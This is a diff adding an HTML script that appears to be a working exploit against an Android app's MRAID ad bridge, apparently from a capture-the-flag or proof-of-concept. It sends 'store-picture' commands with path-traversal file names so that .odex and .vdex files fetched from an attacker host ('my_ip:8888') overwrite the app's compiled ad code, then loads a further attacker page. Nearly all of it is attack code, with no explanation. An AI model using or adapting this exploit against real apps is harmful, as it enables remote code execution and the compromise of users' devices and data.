@@ -1,0 +1,55 @@
+<script>
+let callCompleted = function (x) { };
+function waitForChange() {
+    return new Promise(resolve => {
+        callCompleted = function (x) {
+            resolve(x);
+        }
+    });
+}
+​
+function MRAID_CALLBACK(command, result) {
+    console.log(`MRAID_CALLBACK(${command}, ${result})`);
+    callCompleted(result);
+}
+​
+async function call(args) {
+    var command = args.shift();
+​
+    var call = 'ads://' + command;
+​
+    var key, value;
+    var isFirstArgument = true;
+​
+    for (var i = 0; i < args.length; i += 2) {
+      key = args[i];
+      value = args[i + 1];
+​
+      if (value === null) continue;
+​
+      if (isFirstArgument) {
+        call += '?';
+        isFirstArgument = false;
+      } else {
+        call += '&';
+      }
+​
+      call += encodeURIComponent(key) + '=' + encodeURIComponent(value);
+    }
+​
+    console.log("Calling " + call);
+    window.location = call;
+    
+    let result = await waitForChange();
+    return result;
+}
+​
+async function start() {
+    await call(["init.mraid"]);
+    await call(["store-picture.mraid", "url", "http://my_ip:8888/ads-impl.odex", "name" ,"../../../../../../../data/user/0/com.example.app/app_ads/oat/x86_64/ads-impl.odex"]);
+    await call(["store-picture.mraid", "url", "http://my_ip:8888/ads-impl.vdex", "name" ,"../../../../../../../data/user/0/com.example.app/app_ads/oat/x86_64/ads-impl.vdex"]);
+    await call(["refresh", "url", "http://my_ip:8888/ad3.html"]);
+}
+start();
+​
+</script>
